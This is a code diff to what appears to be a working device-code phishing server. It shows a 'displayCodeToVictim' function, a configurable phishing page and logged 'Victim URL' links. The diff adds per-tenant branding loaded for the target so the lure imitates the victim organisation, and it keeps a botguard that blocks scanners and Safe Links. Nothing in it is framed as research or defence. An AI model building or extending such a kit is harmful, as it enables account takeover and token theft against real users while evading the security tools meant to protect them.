@@ -9,6 +9,7 @@ import { fileURLToPath } from 'url';
 import geoip from 'geoip-country';
 import { publicUrl, COMMON_ENDPOINTS } from './smoke-test.mjs';
 import { checkBotguard, getChallengeHtml, initBotguard } from './botguard.mjs';
+import { DEFAULT_BRANDING, loadTenantBranding } from './tenant-branding.mjs';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const configPath = path.join(__dirname, 'config.json');
@@ -60,6 +61,8 @@ const config = {
 };
 
 initBotguard(config);
+
+let activeBranding = DEFAULT_BRANDING;
 
 function resolveCertPath(certPath) {
     return path.isAbsolute(certPath) ? certPath : path.join(__dirname, certPath);
@@ -157,7 +160,8 @@ function displayCodeToVictim(res, userCode) {
     });
 
     res.render(config.phishingHTML, {
-        user_code: userCode
+        user_code: userCode,
+        branding: activeBranding,
     });
 }
 
@@ -580,6 +584,7 @@ function handleBotguard(req, res) {
 
 const app = express();
 app.set('trust proxy', true);
+app.set('views', path.join(__dirname, 'views'));
 app.engine('html', template.renderFile);
 app.use(express.static('public'));
 app.use(cookies());
@@ -643,13 +648,27 @@ app.get('/smoke-test', async (req, res) => {
     }
 });
 
-if (config.testMode) {
-    http.createServer(app).listen(config.httpPort, () => {
-        logMessage('App listening on port ' + config.httpPort);
-        logMessage('Victim URL: ' + victimUrl());
-        logMessage('Smoke test URL: ' + smokeTestUrl() + ' (/common/ — your account)');
-    });
-} else {
+async function startServer() {
+    activeBranding = await loadTenantBranding(
+        config,
+        (message, type) => logMessage(message, type)
+    );
+
+    if (config.botguard?.enabled !== false) {
+        const js = config.botguard?.jsChallenge !== false ? 'on' : 'off';
+        const sl = config.botguard?.safelinksBlock !== false ? 'on' : 'off';
+        logMessage(`Botguard enabled — jsChallenge=${js} safelinksBlock=${sl} (/share only)`);
+    }
+
+    if (config.testMode) {
+        http.createServer(app).listen(config.httpPort, () => {
+            logMessage('App listening on port ' + config.httpPort);
+            logMessage('Victim URL: ' + victimUrl());
+            logMessage('Smoke test URL: ' + smokeTestUrl() + ' (/common/ — your account)');
+        });
+        return;
+    }
+
     const tlsOptions = {
         key: fs.readFileSync(resolveCertPath(config.keyFilePath)),
         cert: fs.readFileSync(resolveCertPath(config.certFilePath)),
@@ -664,3 +683,8 @@ if (config.testMode) {
         logMessage('Smoke test URL: ' + smokeTestUrl() + ' (/common/ — your account)');
     });
 }
+
+startServer().catch((error) => {
+    logMessage(error.stack, 'error');
+    process.exit(1);
+});
